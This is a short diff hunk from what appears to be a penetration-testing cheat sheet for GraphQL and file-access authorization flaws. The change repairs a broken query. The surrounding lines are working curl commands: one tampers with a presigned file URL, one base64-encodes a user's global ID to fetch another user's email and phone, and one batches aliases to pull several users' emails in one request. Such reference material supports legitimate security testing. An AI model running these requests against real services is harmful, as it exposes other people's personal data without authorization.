@@ -181,7 +181,7 @@ curl -s "$T/files?key=uploads/$BID/secret.pdf&X-Amz-Signature=..."  # drop/alter
 # node(id:) — decode/iterate/encode global ids
 python3 -c "import base64;print(base64.b64encode(b'User:124').decode())"   # VXNlcjoxMjQ=
 curl -s "$T/graphql" -H "$A" -H 'Content-Type: application/json' \
-  -d '{"query":"{ node(i"VXNlcjoxMjQ=\"){ ... on User { id email phone } } }"}'
+  -d '{"query":"{ node(id:\"VXNlcjoxMjQ=\"){ ... on User { id email phone } } }"}'
 # alias batching — many objects in one request:
 curl -s "$T/graphql" -H "$A" -H 'Content-Type: application/json' \
   -d '{"query":"{ a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }"}'
